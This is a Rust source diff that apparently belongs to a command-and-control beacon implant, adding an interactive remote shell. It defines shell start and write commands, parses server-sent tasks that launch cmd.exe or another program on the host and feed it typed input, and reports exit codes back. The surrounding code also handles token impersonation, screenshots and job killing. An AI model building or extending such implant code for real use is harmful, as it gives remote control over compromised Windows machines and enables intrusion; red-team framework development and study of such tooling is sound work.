@@ -136,6 +136,8 @@ pub const COMMAND_JOB_LIST: u32 = 46;
 pub const COMMAND_JOBS_KILL: u32 = 47;
 /// Native JOB_TYPE_* / JOB_STATE_* (JobsController.h).
 pub const JOB_TYPE_PROCESS: u8 = 0x3;
+pub const JOB_TYPE_SHELL: u8 = 0x4;
+pub const JOB_STATE_STARTING: u8 = 0x0;
 pub const JOB_STATE_RUNNING: u8 = 0x1;
 pub const JOB_STATE_FINISHED: u8 = 0x2;
 pub const JOB_STATE_KILLED: u8 = 0x3;
@@ -158,6 +160,10 @@ pub const COMMAND_TOKEN_LIST: u32 = 56;
 pub const COMMAND_TOKEN_REMOVE: u32 = 57;
 pub const COMMAND_TOKEN_GETUID: u32 = 58;
 pub const COMMAND_TOKEN_PRIVS: u32 = 59;
+/// Interactive shell (native beacon_agent numbering — the client's
+/// terminal drives Start/Write, close rides `jobs kill`).
+pub const COMMAND_SHELL_START: u32 = 71;
+pub const COMMAND_SHELL_WRITE: u32 = 72;
 /// Screenshot stream states (COMMAND_SCREENSHOT result byte).
 pub const SCREENSHOT_START: u8 = 1;
 pub const SCREENSHOT_CONTINUE: u8 = 2;
@@ -202,6 +208,10 @@ pub const COMMAND_ERROR: u32 = 0x1111_FFFF;
 pub const PATH_CAP: usize = 260;
 /// Longest credential field of `tkn make` (the native token.c caps at 128).
 pub const TOKEN_FIELD_CAP: usize = 128;
+/// Longest shell program path (`shell start`).
+pub const SHELL_PROG_CAP: usize = 128;
+/// Longest shell input write (typed characters — terminal-sized).
+pub const SHELL_INPUT_CAP: usize = 512;
 
 /// A parsed server task (the commands the beacon can delimit and execute;
 /// anything else in the pack stops the parse — the server keeps unprocessed
@@ -295,6 +305,19 @@ pub enum Task {
     TokenGetuid,
     /// `COMMAND_TOKEN_PRIVS`: the current token's privileges.
     TokenPrivs,
+    /// `COMMAND_SHELL_START` with the terminal id and the program (ACP
+    /// bytes; empty = the cmd.exe default).
+    ShellStart {
+        terminal_id: u32,
+        program_len: u16,
+        program: [u8; SHELL_PROG_CAP],
+    },
+    /// `COMMAND_SHELL_WRITE` with the terminal id and the raw input bytes.
+    ShellWrite {
+        terminal_id: u32,
+        data_len: u16,
+        data: [u8; SHELL_INPUT_CAP],
+    },
 }
 
 impl Task {
@@ -498,6 +521,54 @@ pub fn parse_task(r: &mut Reader) -> Option<(Task, u32)> {
         }
         COMMAND_TOKEN_GETUID => Task::TokenGetuid,
         COMMAND_TOKEN_PRIVS => Task::TokenPrivs,
+        COMMAND_SHELL_START => {
+            let terminal_id = r.u32_le()?;
+            // The program is a pack string that MAY be empty (cmd.exe
+            // default) — parse the length manually, pack_string rejects
+            // zero.
+            let len = r.u32_le()? as usize;
+            if len > SHELL_PROG_CAP {
+                return None;
+            }
+            let bytes = r.take(len)?;
+            let mut program = [0u8; SHELL_PROG_CAP];
+            let mut i = 0;
+            while i < bytes.len() {
+                program[i] = bytes[i];
+                i += 1;
+            }
+            // Trailing NUL is separator, not data.
+            let mut n = bytes.len();
+            while n > 0 && program[n - 1] == 0 {
+                n -= 1;
+            }
+            Task::ShellStart {
+                terminal_id,
+                program_len: n as u16,
+                program,
+            }
+        }
+        COMMAND_SHELL_WRITE => {
+            let terminal_id = r.u32_le()?;
+            // The native packs `int len || raw bytes` ([]byte appends
+            // without a prefix in PackArray).
+            let len = r.u32_le()? as usize;
+            if len > SHELL_INPUT_CAP {
+                return None;
+            }
+            let bytes = r.take(len)?;
+            let mut data = [0u8; SHELL_INPUT_CAP];
+            let mut i = 0;
+            while i < bytes.len() {
+                data[i] = bytes[i];
+                i += 1;
+            }
+            Task::ShellWrite {
+                terminal_id,
+                data_len: bytes.len() as u16,
+                data,
+            }
+        }
         _ => return None,
     };
     let id = r.u32_le()?;
@@ -835,6 +906,12 @@ pub fn push_job_output(w: &mut Writer, job_id: u32, job_type: u8, state: u8, dat
 /// `byte type || byte state`.
 pub fn push_job_end(w: &mut Writer, job_id: u32, job_type: u8, state: u8) -> bool {
     push_result_header(w, job_id, COMMAND_JOB) && w.u8(job_type) && w.u8(state)
+}
+
+/// JOB end record with the exit code (shell FINISHED — the terminal
+/// closes with the status): `byte type || byte state || int errorCode`.
+pub fn push_job_end_code(w: &mut Writer, job_id: u32, job_type: u8, state: u8, code: u32) -> bool {
+    push_result_header(w, job_id, COMMAND_JOB) && w.u8(job_type) && w.u8(state) && w.u32(code)
 }
 
 /// JOB_LIST result: `int count`, then `int jobId || word type || word pid`
